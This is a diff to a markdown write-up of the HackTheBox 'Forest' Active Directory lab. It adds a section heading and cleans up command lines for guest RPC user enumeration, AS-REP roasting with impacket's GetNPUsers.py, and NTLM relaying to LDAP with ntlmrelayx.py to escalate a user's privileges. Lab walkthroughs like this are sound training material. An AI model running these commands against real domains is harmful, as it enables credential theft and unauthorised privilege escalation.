@@ -10,6 +10,7 @@ categories: HackTheBox-Active-Directory
 
 ![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%201.png)
 
+## Enumerating and Kerberoasting
 ⇒ We are able to authenticate to rpc as guest user and enumerate users :
 
 `rpcclient -U guest -H 10.10.10.161`
@@ -22,7 +23,7 @@ categories: HackTheBox-Active-Directory
 
 ⇒ **ASREPRoasting** using impacket tool [GetNPUsers.py](http://getnpusers.py/)
 
-`python3 [GetNPUsers.py](http://getnpusers.py/) -dc-ip 10.10.10.161 htb.local/ -usersfile users.txt -output hash`
+`python3 GetNPUsers.py -dc-ip 10.10.10.161 htb.local/ -usersfile users.txt -output hash`
 
 ![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%203.png)
 
@@ -62,7 +63,7 @@ categories: HackTheBox-Active-Directory
 
 ![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Forest%20Box%20a8a85dd88ec540a7a711b0152efe10c1/Untitled%209.png)
 
-[`ntlmrelayx.py](http://ntlmrelayx.py/) -t ldap://10.10.10.161 --escalate-user jake` 
+`ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user jake` 
 
 → Authenticating :
 
